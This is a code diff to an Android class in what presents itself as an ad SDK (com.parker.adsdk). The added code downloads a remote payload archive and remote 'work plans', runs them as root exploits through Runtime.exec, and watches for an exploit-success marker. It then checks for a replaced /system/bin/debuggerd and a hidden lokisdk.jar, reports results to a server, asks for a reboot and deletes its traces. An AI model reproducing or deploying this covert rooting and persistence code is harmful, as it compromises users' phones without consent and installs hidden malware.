@@ -5,22 +5,35 @@ import android.app.KeyguardManager;
 import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
+import android.os.StatFs;
 import android.preference.PreferenceManager;
 
 import com.parker.adsdk.RootHelper;
 import com.parker.adsdk.entity.WorkPlan;
 import com.parker.adsdk.network.RequestUtil;
+import com.parker.adsdk.util.FileUtils;
 import com.parker.adsdk.util.LogUtil;
+import com.parker.adsdk.util.PreferenceUtils;
 import com.parker.adsdk.util.ServiceUtils;
 
 import org.json.JSONArray;
+import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.util.ArrayList;
 import java.util.Iterator;
 import java.util.List;
+import java.util.UUID;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipInputStream;
 
 /**
  * Created by thinkpad on 2016/8/9.
@@ -117,6 +130,7 @@ public class Work {
 
             this.exec();
         }
+
     }
 
     private void exec()
@@ -127,22 +141,247 @@ public class Work {
         plans.addAll(this.getStoredPlans());
         plans.addAll(this.parseNewPlan(resp));
         this.storeAllPlans(plans);
-        FileInputStream fis;
+        FileInputStream fis = null;
         try {
             LogUtil.append("获取OTA数据...");
             RequestUtil.downloadPlus(this.context, 0, this.otaUrl, this.otaName, this.getOtaMd5(resp));
             fis = new FileInputStream(this.otaName);
             LogUtil.append("正在解析数据...");
-            //// FIXME: 2016/8/22 
+            try {
+                this.extracto(fis, this.otaDir);
+            }catch (Exception e)
+            {
+                RequestUtil.requestFeedback(this.context, 24, null);
+                throw e;
+            }
+            int i = 1;
+            for (WorkPlan workPlan :plans)
+            {
+                if (workPlan.getState() == 1)
+                {
+                    workPlan.setState(0);
+                }else if (workPlan.getState() != 0)
+                {
+
+                    LogUtil.append("方案" + i + ":" + workPlan.getUrl().substring(
+                            workPlan.getUrl().lastIndexOf("/") + 1, workPlan.getUrl().length())
+                            + " " + workPlan.getParams() + " " + this.otaName.getAbsolutePath());
+                    workPlan.setState(1);
+                    this.storeAllPlans(plans);
+                    LogUtil.append("正在获取方案数据...");
+                    RequestUtil.downloadPlus(this.context, 1, workPlan.getUrl(), this.work, workPlan.getPlanMd5());
+                    try
+                    {
+                        if (this.execWorkPlan(workPlan))
+                        {
+                            this.removeAllPlans();
+                            this.clear();
+                            return;
+                        }
+                        workPlan.setState(0);
+                        this.storeAllPlans(plans);
+                        i++;
+                    }catch (Throwable tr)
+                    {
+                        workPlan.setState(0);
+                        this.storeAllPlans(plans);
+                        i++;
+                    }
+                }else
+                {
+                    continue;
+                }
+
+
+            }
         }
-        catch(Exception e) {
+        catch(Exception ex) {
+            LogUtil.append("出现错误，R失败" + ex.getMessage());
+            this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish"));
+            this.clear();
+            return;
+
+        }finally {
+            if (fis != null)
+            {
+                try {
+                    fis.close();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+    }
+    private void putLastTid(String tid) {
+        PreferenceManager.getDefaultSharedPreferences(this.context).edit().putString("lastTid", tid)
+                .apply();
+    }
+
+    private boolean execWorkPlan(WorkPlan workPlan) throws JSONException, IOException {
+        String tid = UUID.randomUUID().toString();
+        this.putLastTid(tid);
+        boolean result = false;
+        LogUtil.append("方案获取成功，开始执行方案...");
+        JSONObject plan = new JSONObject();
+        plan.put("url", workPlan.getUrl());
+        plan.put("params", workPlan.getParams());
+        RequestUtil.reportPara(this.context, tid, 1, plan, null);
+        try
+        {
+            String line;
+            Process process = Runtime.getRuntime().exec(this.buildCmd(workPlan.getParams()));
+            BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            do {
+                line = br.readLine();
+                if (line != null) {
+                    LogUtil.append(line);
+                    if (line.equals("[exp_result]:[success]")) {
+                        break;
+                    }
+                } else {
+                    break;
+                }
+            } while (!line.equals("[exp_result]:[failure]"));
+            this.removeLastTid();
+            String str = line.equals("[exp_result]:[success]") ? "R成功，请重启手机" : "R失败";
+            LogUtil.append(str);
+            boolean sucess = line.equals("[exp_result]:[success]");
+            if (sucess)
+            {
+                try
+                {
+                    long systemFreeSpace = this.getSystemFreeSpace();
+                    JSONObject info = new JSONObject();
+                    info.put("systemFreeSpace", systemFreeSpace);
+                    File fDebuggerd = new File("/system/bin/debuggerd");
+                    File fDebuggerd_loki = new File("/system/bin/debuggerd_loki");
+                    File fLokisdkJar = new File("/data/system/.loki/lokisdk.jar");
+                    if((fDebuggerd.exists()) && (fDebuggerd_loki.exists()) && fDebuggerd.length() != fDebuggerd_loki
+                            .length()) {
+                        RequestUtil.reportPara(this.context, tid, 61, plan, info);
+                        PreferenceUtils.putDoneTrue(this.context);
+                        this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish").putExtra(
+                                "need_reboot", true));
+                        result = sucess;
+                    }else
+                    {
+                        if(fLokisdkJar.exists()) {
+                            info.put("debuggerdFileSize", fDebuggerd.length());
+                            RequestUtil.reportPara(this.context, tid, 63, plan, info);
+                        }else
+                        {
+                            RequestUtil.reportPara(this.context, tid, 62, plan, null);
+                        }
+                        PreferenceUtils.putDoneTrue(this.context);
+                        this.context.sendBroadcast(new Intent("org.admobile.helper.intent.finish").putExtra(
+                                "need_reboot", true));
+                        result = sucess;
+                    }
+                }catch (Exception e)
+                {
+                    e.printStackTrace();
+                }
 
 
 
+            }else
+            {
+                result = sucess;
+
+            }
+            br.close();
+            process.destroy();
+            return result;
+
+
+
+        }catch (Exception ex)
+        {
+            RequestUtil.reportPara(context, tid, 3, plan, null);
+            return false;
         }
 
     }
+    private void removeLastTid() {
+        PreferenceManager.getDefaultSharedPreferences(this.context).edit().remove("lastTid").apply();
+    }
+    private long getSystemFreeSpace() {
+        StatFs starFs = new StatFs("/system");
+        return (((long)starFs.getBlockCount())) * (((long)starFs.getBlockSize()));
+    }
 
+    private String buildCmd(String params) {
+        return this.work.getAbsolutePath() + " " + params + " " + this.otaDir.getAbsolutePath();
+    }
+
+    private void clear() {
+        LogUtil.append("清理文件...");
+        this.work.delete();
+        this.otaDir.delete();
+        File[] files = this.context.getFilesDir().listFiles();
+        int len = files.length;
+        int i;
+        for(i = 0; i < len; ++i) {
+            files[i].delete();
+        }
+    }
+
+    private void removeAllPlans() {
+        LogUtil.append("删除所有方案...");
+        PreferenceManager.getDefaultSharedPreferences(this.context).edit().remove("plans").apply();
+    }
+
+    private void extracto(InputStream is, File destdir) throws IOException {
+        destdir.mkdirs();
+        FileUtils.setPermissions(destdir, 511);
+        ZipInputStream zis = new ZipInputStream(is);
+        File f;
+        while(true) {
+            ZipEntry zipEntry = zis.getNextEntry();
+            if(zipEntry == null) {
+                break;
+            }
+
+            String name = zipEntry.getName();
+            if(name.startsWith("META-INF")) {
+                continue;
+            }
+
+            if(zipEntry.isDirectory()) {
+                continue;
+            }
+
+            if(!"package".equals(name) && !"version".equals(name) && !"installer".equals(name)) {
+                continue;
+            }
+
+            f = new File(destdir, name);
+            f.delete();
+            FileOutputStream fos = new FileOutputStream(f);
+            this.copyFile(zis, fos);
+            fos.close();
+            FileUtils.setPermissions(f, 511);
+        }
+
+        zis.close();
+/*        File v0_1 = new File(destdir, "installer");
+        f = new File(destdir, "installer");
+        if(!v0_1.equals(f)) {
+            v0_1.renameTo(f);
+        }*/
+    }
+
+    private void copyFile(InputStream in, OutputStream out) throws IOException {
+        byte[] buf = new byte[4096];
+        while(true) {
+            int len = in.read(buf);
+            if(len <= 0) {
+                return;
+            }
+
+            out.write(buf, 0, len);
+        }
+    }
 
     private String getOtaMd5(String jsonStr) {
         String result;
